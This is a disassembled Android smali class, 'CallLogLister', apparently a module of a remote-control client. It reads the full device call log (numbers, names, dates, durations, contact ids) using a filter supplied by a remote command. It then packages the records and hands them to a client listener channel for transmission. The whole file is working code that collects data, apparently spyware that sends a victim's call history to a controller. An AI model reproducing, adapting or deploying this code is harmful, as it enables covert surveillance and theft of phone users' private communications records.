.class public Lmy/app/Library/CallLogLister;
.super Ljava/lang/Object;
.source "CallLogLister.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static listCallLog(Lmy/app/client/ClientListener;I[B)Z
    .locals 21
    .parameter "c"
    .parameter "channel"
    .parameter "args"

    .prologue
    .line 35
    new-instance v19, Ljava/util/ArrayList;

    invoke-direct/range {v19 .. v19}, Ljava/util/ArrayList;-><init>()V

    .line 37
    .local v19, l:Ljava/util/ArrayList;,"Ljava/util/ArrayList<LPacket/CallPacket;>;"
    const/16 v20, 0x0

    .line 38
    .local v20, ret:Z
    new-instance v5, Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-direct {v5, v0}, Ljava/lang/String;-><init>([B)V

    .line 39
    .local v5, WHERE_CONDITION:Ljava/lang/String;
    const-string v7, "date DESC"

    .line 40
    .local v7, SORT_ORDER:Ljava/lang/String;
    const/4 v2, 0x7

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "_id"

    aput-object v3, v4, v2

    const/4 v2, 0x1

    const-string v3, "type"

    aput-object v3, v4, v2

    const/4 v2, 0x2

    const-string v3, "date"

    aput-object v3, v4, v2

    const/4 v2, 0x3

    const-string v3, "duration"

    aput-object v3, v4, v2

    const/4 v2, 0x4

    const-string v3, "number"

    aput-object v3, v4, v2

    const/4 v2, 0x5

    const-string v3, "name"

    aput-object v3, v4, v2

    const/4 v2, 0x6

    const-string v3, "raw_contact_id"

    aput-object v3, v4, v2

    .line 42
    .local v4, column:[Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ClientListener;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    sget-object v3, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v18

    .line 45
    .local v18, cursor:Landroid/database/Cursor;
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-eqz v2, :cond_2

    .line 46
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->moveToFirst()Z

    .line 49
    :cond_0
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->getColumnCount()I

    move-result v2

    if-eqz v2, :cond_1

    .line 50
    const-string v2, "_id"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    .line 51
    .local v9, id:I
    const-string v2, "type"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v10

    .line 52
    .local v10, type:I
    const-string v2, "date"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v11

    .line 53
    .local v11, date:J
    const-string v2, "duration"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    .line 54
    .local v13, duration:J
    const-string v2, "raw_contact_id"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v15

    .line 55
    .local v15, raw_contact_id:I
    const-string v2, "number"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 56
    .local v16, number:Ljava/lang/String;
    const-string v2, "name"

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v18

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v17

    .line 58
    .local v17, name:Ljava/lang/String;
    new-instance v8, LPacket/CallPacket;

    invoke-direct/range {v8 .. v17}, LPacket/CallPacket;-><init>(IIJJILjava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 60
    .end local v9           #id:I
    .end local v10           #type:I
    .end local v11           #date:J
    .end local v13           #duration:J
    .end local v15           #raw_contact_id:I
    .end local v16           #number:Ljava/lang/String;
    .end local v17           #name:Ljava/lang/String;
    :cond_1
    invoke-interface/range {v18 .. v18}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    .line 48
    if-nez v2, :cond_0

    .line 61
    const/16 v20, 0x1

    .line 68
    :goto_0
    new-instance v2, LPacket/CallLogPacket;

    move-object/from16 v0, v19

    invoke-direct {v2, v0}, LPacket/CallLogPacket;-><init>(Ljava/util/ArrayList;)V

    invoke-virtual {v2}, LPacket/CallLogPacket;->build()[B

    move-result-object v2

    move-object/from16 v0, p0

    move/from16 v1, p1

    invoke-virtual {v0, v1, v2}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 69
    return v20

    .line 64
    :cond_2
    const/16 v20, 0x0

    goto :goto_0
.end method
